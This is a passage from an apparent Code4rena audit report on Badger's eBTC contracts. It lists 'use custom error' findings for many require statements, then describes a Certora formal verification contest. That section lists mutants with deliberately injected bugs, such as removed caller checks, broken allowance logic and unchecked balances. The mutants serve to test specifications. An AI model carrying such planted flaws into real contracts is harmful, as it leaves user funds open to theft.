[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L300-L303)


#

```
File: contracts/EBTCToken.sol

307    require(
308                msg.sender == borrowerOperationsAddress,
309                "EBTCToken: Caller is not BorrowerOperations"
310            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L307-L310](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L307-L310)


#

```
File: contracts/EBTCToken.sol

315    require(
316                msg.sender == borrowerOperationsAddress ||
317                    msg.sender == cdpManagerAddress ||
318                    isAuthorized(msg.sender, msg.sig),
319                "EBTC: Caller is neither BorrowerOperations nor CdpManager nor authorized"
320            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L315-L320](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L315-L320)


#

```
File: contracts/EBTCToken.sol

324    require(msg.sender == cdpManagerAddress, "EBTC: Caller is not CdpManager")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L324](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L324)


#

```
File: contracts/LeverageMacroBase.sol

40    revert("Must be overridden")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L40](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L40)


#

```
File: contracts/LeverageMacroBase.sol

45    require(owner() == msg.sender, "Must be owner")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L45](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L45)


#

```
File: contracts/LeverageMacroBase.sol

179    require(
180                    cdpInfo.status == checkParams.expectedStatus,
181                    "!LeverageMacroReference: openCDP status check"
182                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L179-L182](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L179-L182)


#

```
File: contracts/LeverageMacroBase.sol

191    require(
192                    cdpInfo.status == checkParams.expectedStatus,
193                    "!LeverageMacroReference: adjustCDP status check"
194                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L191-L194](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L191-L194)


#

```
File: contracts/LeverageMacroBase.sol

201    require(
202                    cdpInfo.status == checkParams.expectedStatus,
203                    "!LeverageMacroReference: closeCDP status check"
204                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L201-L204](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L201-L204)


#

```
File: contracts/LeverageMacroBase.sol

249    require(check.value >= valueToCheck, "!LeverageMacroReference: gte post check")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L249](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L249)


#

```
File: contracts/LeverageMacroBase.sol

251    require(check.value <= valueToCheck, "!LeverageMacroReference: let post check")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L251](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L251)


#

```
File: contracts/LeverageMacroBase.sol

253    require(check.value == valueToCheck, "!LeverageMacroReference: equal post check")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L253](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L253)


#

```
File: contracts/LeverageMacroBase.sol

255    revert("Operator not found")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L255](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L255)


#

```
File: contracts/LeverageMacroBase.sol

352    require(initiator == address(this), "LeverageMacroReference: wrong initiator for flashloan")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L352](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L352)


#

```
File: contracts/LeverageMacroBase.sol

356    require(
357                    msg.sender == address(borrowerOperations),
358                    "LeverageMacroReference: wrong lender for eBTC flashloan"
359                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L356-L359](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L356-L359)


#

```
File: contracts/LeverageMacroBase.sol

362    require(
363                    msg.sender == address(activePool),
364                    "LeverageMacroReference: wrong lender for stETH flashloan"
365                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L362-L365](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L362-L365)


#

```
File: contracts/LeverageMacroBase.sol

421    require(success, "Call has failed")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L421](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L421)


#

```
File: contracts/LeverageMacroBase.sol

440    require(
441                        IERC20(swapChecks[i].tokenToCheck).balanceOf(address(this)) >
442                            swapChecks[i].expectedMinOut,
443                        "LeverageMacroReference: swap check failure!"
444                    )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L440-L444](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L440-L444)


#

```
File: contracts/LeverageMacroBase.sol

452    require(addy != address(borrowerOperations))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L452](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L452)


#

```
File: contracts/LeverageMacroBase.sol

453    require(addy != address(sortedCdps))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L453](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L453)


#

```
File: contracts/LeverageMacroBase.sol

454    require(addy != address(activePool))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L454](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L454)


#

```
File: contracts/LeverageMacroBase.sol

455    require(addy != address(cdpManager))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L455](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L455)


#

```
File: contracts/LeverageMacroBase.sol

456    require(addy != address(this))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L456](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L456)


#

```
File: contracts/LiquidationLibrary.sol

56    require(_partialAmount != 0, "LiquidationLibrary: use `liquidate` for 100%")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L56)


#

```
File: contracts/LiquidationLibrary.sol

82    require(
83                    _checkICRAgainstLiqThreshold(_ICR, _TCR),
84                    "LiquidationLibrary: ICR is not below liquidation threshold in current mode"
85                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L82-L85](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L82-L85)


#

```
File: contracts/LiquidationLibrary.sol

89    require(
90                    cachedLastGracePeriodStartTimestamp != UNSET_TIMESTAMP,
91                    "LiquidationLibrary: Recovery Mode grace period not started"
92                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L89-L92](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L89-L92)


#

```
File: contracts/LiquidationLibrary.sol

93    require(
94                    block.timestamp >
95                        cachedLastGracePeriodStartTimestamp + recoveryModeGracePeriodDuration,
96                    "LiquidationLibrary: Recovery mode grace period still in effect"
97                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L93-L97](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L93-L97)


#

```
File: contracts/LiquidationLibrary.sol

477    require(
478                    getCachedICR(_cdpId, _partialState.price) >= _partialState.ICR,
479                    "LiquidationLibrary: !_newICR>=_ICR"
480                )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L477-L480](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L477-L480)


#

```
File: contracts/LiquidationLibrary.sol

680    require(
681                _cdpArray.length != 0,
682                "LiquidationLibrary: Calldata address array must not be empty"
683            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L680-L683](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L680-L683)


#

```
File: contracts/LiquidationLibrary.sol

710    require(totals.totalDebtInSequence > 0, "LiquidationLibrary: nothing to liquidate")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L710](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L710)


#

```
File: contracts/LiquidationLibrary.sol

901    require(
902                (_partialDebt + _convertDebtDenominationToBtc(MIN_NET_STETH_BALANCE, _price)) <=
903                    _entireDebt,
904                "LiquidationLibrary: Partial debt liquidated must be less than total debt"
905            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L901-L905](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L901-L905)


#

```
File: contracts/LiquidationLibrary.sol

909    require(
910                _entireColl >= MIN_NET_STETH_BALANCE,
911                "LiquidationLibrary: Coll remaining in partially liquidated CDP must be >= minimum"
912            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L909-L912](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L909-L912)


#

```
File: contracts/PriceFeed.sol

79    require(
80                !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
81                    !_chainlinkIsFrozen(chainlinkResponse),
82                "PriceFeed: Chainlink must be working and current"
83            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83)


#

```
File: contracts/SimplifiedDiamondLike.sol

52    require(msg.sender == owner)
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L52](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L52)


#

```
File: contracts/SimplifiedDiamondLike.sol

56    require(sig != 0x94b24d09)
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L56)


#

```
File: contracts/SimplifiedDiamondLike.sol

67    require(msg.sender == owner)
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L67](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L67)


#

```
File: contracts/SimplifiedDiamondLike.sol

77    require(msg.sender == address(this))
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L77](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L77)


#

```
File: contracts/SimplifiedDiamondLike.sol

111    require(msg.sender == owner, "Must be owner")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L111](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L111)


#

```
File: contracts/SimplifiedDiamondLike.sol

154    require(success)
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L154](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L154)


#

```
File: contracts/SimplifiedDiamondLike.sol

179    require(ds.settings.callbackEnabledForCall, "Only Enabled Callbacks")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L179](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L179)


#

```
File: contracts/SimplifiedDiamondLike.sol

187    require(facet != address(0), "Diamond: Function does not exist")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L187](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L187)


#

```
File: contracts/SortedCdps.sol

352    require(cdpManager.getCdpStatus(_id) == 0, "SortedCdps: new id is NOT nonExistent!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L352](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L352)


#

```
File: contracts/SortedCdps.sol

365    require(!isFull(), "SortedCdps: List is full")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L365](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L365)


#

```
File: contracts/SortedCdps.sol

367    require(!contains(_id), "SortedCdps: List already contains the node")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L367](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L367)


#

```
File: contracts/SortedCdps.sol

369    require(_id != dummyId, "SortedCdps: Id cannot be zero")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L369](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L369)


#

```
File: contracts/SortedCdps.sol

371    require(_NICR > 0, "SortedCdps: NICR must be positive")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L371](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L371)


#

```
File: contracts/SortedCdps.sol

422    require(_len > 1, "SortedCdps: batchRemove() only apply to multiple cdpIds!")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L422](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L422)


#

```
File: contracts/SortedCdps.sol

427    require(
428                _firstPrev != dummyId || _lastNext != dummyId,
429                "SortedCdps: batchRemove() leave ZERO node left!"
430            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L427-L430](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L427-L430)


#

```
File: contracts/SortedCdps.sol

433    require(contains(_ids[i]), "SortedCdps: List does not contain the id")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L433](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L433)


#

```
File: contracts/SortedCdps.sol

458    require(contains(_id), "SortedCdps: List does not contain the id")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L458](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L458)


#

```
File: contracts/SortedCdps.sol

506    require(contains(_id), "SortedCdps: List does not contain the id")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L506](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L506)


#

```
File: contracts/SortedCdps.sol

508    require(_newNICR > 0, "SortedCdps: NICR must be positive")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508)


#

```
File: contracts/SortedCdps.sol

715    require(msg.sender == address(cdpManager), "SortedCdps: Caller is not the CdpManager")
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L715](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L715)


#

```
File: contracts/SortedCdps.sol

720    require(
721                msg.sender == borrowerOperationsAddress || msg.sender == address(cdpManager),
722                "SortedCdps: Caller is neither BO nor CdpM"
723            )
```
 use custom error instead 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L720-L723](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L720-L723)


</details>

# 

***

# [Formal Verification Competition](#formal-verification-competition)

A C4 formal verification competition is an event in partnership with Certora in which Wardens use formal verification tools to mathematically prove the correctness of a program or system in exhange for a bounty provided by sponsoring projects.

During the formal verification competition that took place alongside the Badger eBTC audit, Wardens utilized the Certora Prover (verification tool) to conduct formal verification of the Badger eBTC smart contract system.

## Summary

Mutations were used to evaluate the quality of the specification. The mutants are described below and are available [here](https://github.com/code-423n4/2023-10-badger/tree/main/certora/mutations). Additionally, the top specifications have been added to the [C4 competition repo](https://github.com/code-423n4/2023-10-badger) and some specific properties have been included in this report as good examples. Also note that each participant's Certora folder has a mutations folder with .csv files with more detailed results and .txt file with a link to the report for each spec.

The final results for all participants can be found [here](https://github.com/code-423n4/2023-10-badger-findings/blob/main/Badger-Final-FV-Results.md).

## Mutations

### [ActivePool](https://github.com/code-423n4/2023-10-badger/tree/main/certora/mutations/ActivePool)

- **[ActivePool\_0.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_0.sol)**: Remove sufficient balance check from `transferSystemCollShares`.

- **[ActivePool\_1.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_1.sol)**: In `transferSystemCollSharesAndLiquidatorReward`, call `_transferCollSharesWithContractHooks` with wrong amount of shares.

- **[ActivePool\_2.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_2.sol)**: Remove `_requireCallerIsCdpManager` check from `allocateSystemCollSharesToFeeRecipient`.

- **[ActivePool\_3.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_3.sol)**: Fail to update `systemCollShares` in `transferSystemCollShares`.

- **[ActivePool\_4.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_4.sol)**: Remove Auth check from `setFeeRecipientAddress`.

- **[ActivePool\_5.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_5.sol)**: Pull just `fee` instead of `amountWithFee` in `flashLoan`.

- **[ActivePool\_6.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_6.sol)**: Transfer out full balance instead of just `amount` in `flashLoan`.

- **[ActivePool\_7.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_7.sol)**: Remove `_requireCallerIsBorrowerOperations` check from `increaseSystemCollShares`.

- **[ActivePool\_8.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_8.sol)**: Fail to update `feeRecipientCollShares` in `allocateSystemCollSharesToFeeRecipient`.

- **[ActivePool\_9.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_9.sol)**: Call `safeTransferFrom` instead of `safeTransfer` in `sweepToken`.

- **[ActivePool\_10.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_10.sol)**: Always pause in `setFlashLoansPaused`.

- **[ActivePool\_P.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/ActivePool/ActivePool_P.sol)**: Subtract `_shares` from `cachedSystemCollShares` instead of adding in `transferSystemCollShares`.

### [CollSurplusPool](https://github.com/code-423n4/2023-10-badger/tree/main/certora/mutations/CollSurplusPool)

- **[CollSurplusPool\_0.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_0.sol)**: Update `balances[_account]` to `_amount` instead `newAmount` in `increaseSurplusCollShares`.

- **[CollSurplusPool\_1.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_1.sol)**: Remove `cachedTotalSurplusCollShares >= claimableColl` check from `claimSurplusCollShares`.

- **[CollSurplusPool\_2.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_2.sol)**: Fail to update `totalSurplusCollShares` in `claimSurplusCollShares`.

- **[CollSurplusPool\_3.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_3.sol)**: Transfer `collateral` instead of inputted `token` in `sweepToken`.

- **[CollSurplusPool\_4.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_4.sol)**: Replace `totalSurplusCollShares` with `_value` instead of adding to it in `increaseTotalSurplusCollShares`.

- **[CollSurplusPool\_5.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_5.sol)**: Sweep from `feeRecipientAddress` in `sweepToken`.

- **[CollSurplusPool\_6.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_6.sol)**: Fail to zero `balnaces[_account]` in `claimSurplusCollShares`.

- **[CollSurplusPool\_7.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_7.sol)**: Remove `_requireCallerIsCdpManager` check in `increaseSurplusCollShares`.

- **[CollSurplusPool\_8.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_8.sol)**: Gift `msg.sender` 100e18 tokens in the constructor.

- **[CollSurplusPool\_P.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/CollSurplusPool/CollSurplusPool_P.sol)**: Replace `safeTransfer` with `safeTransferFrom` in `sweepToken`.

### [EBTCToken](https://github.com/code-423n4/2023-10-badger/tree/main/certora/mutations/EBTCToken)

- **[EBTCToken\_0.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_0.sol)**: Cache recipient balances before updating.

- **[EBTCToken\_1.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_1.sol)**: Always transfer to `cdpManagerAddress` in `transfer`.

- **[EBTCToken\_2.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_2.sol)**: Remove functionality from `increaseAllowance`.

- **[EBTCToken\_3.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_3.sol)**: Remove sufficient balance check from `_burn`.

- **[EBTCToken\_4.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_4.sol)**: Remove sufficient allowance check from `transferFrom`.

- **[EBTCToken\_5.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_5.sol)**: Switch `recipient` and `msg.sender` in `transfer`.

- **[EBTCToken\_6.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_6.sol)**: Always give max allowance in `approve`.

- **[EBTCToken\_7.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_7.sol)**: Fail to update `totalSupply` in `_mint`.

- **[EBTCToken\_8.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_8.sol)**: Fail to update `totalSupply` in `_burn`.

- **[EBTCToken\_9.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_9.sol)**: Transfer whole balance in `transfer`.

- **[EBTCToken\_10.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_10.sol)**: Remove `_requireValidRecipient` from `transfer`.

- **[EBTCToken\_11.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_11.sol)**: Replace `sender` with `recipient` in definition of `cachedSenderBalances` in `_transfer`.

- **[EBTCToken\_12.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_12.sol)**: Remove functionality from `decreaseAllowance`.

- **[EBTCToken\_13.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/EBTCToken/EBTCToken_13.sol)**: Break allowance check in `transferFrom`.

### [SortedCdps](https://github.com/code-423n4/2023-10-badger/tree/main/certora/mutations/SortedCdps)

- **[SortedCdps\_0.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_0.sol)**: Set `data.size` to 0 instead of `data.size - _len` in `batchRemove`.

- **[SortedCdps\_1.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_1.sol)**: Check if statement check to false in `_validInsertPosition`.

- **[SortedCdps\_2.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_2.sol)**: Return modified boolean in `_validInsertPosition`.

- **[SortedCdps\_3.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_3.sol)**: Replace `_NICR` with 0 in `_findInsertPosition`.

- **[SortedCdps\_4.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_4.sol)**: Modify `head` instead of `tail` in `_remove`.

- **[SortedCdps\_5.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_5.sol)**: Always set `nextId` to 0 in `_findInsertPosition`.

- **[SortedCdps\_6.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_6.sol)**: Remove containment check from `_insert`.

- **[SortedCdps\_7.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_7.sol)**: Partially remove functionality in `_insert`.

- **[SortedCdps\_8.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_8.sol)**: Swap lines in `_ascendList`.

- **[SortedCdps\_9.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_9.sol)**: Fail to update `data.size` in `_insert`.

- **[SortedCdps\_10.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_10.sol)**: Mutate boolean check in `_remove`.

- **[SortedCdps\_P.sol](https://github.com/code-423n4/2023-10-badger/blob/main/certora/mutations/SortedCdps/SortedCdps_P.sol)**: Remove `_requireCallerIsBOorCdpM` check from `insert`.

## Notable Properties

### ActivePool

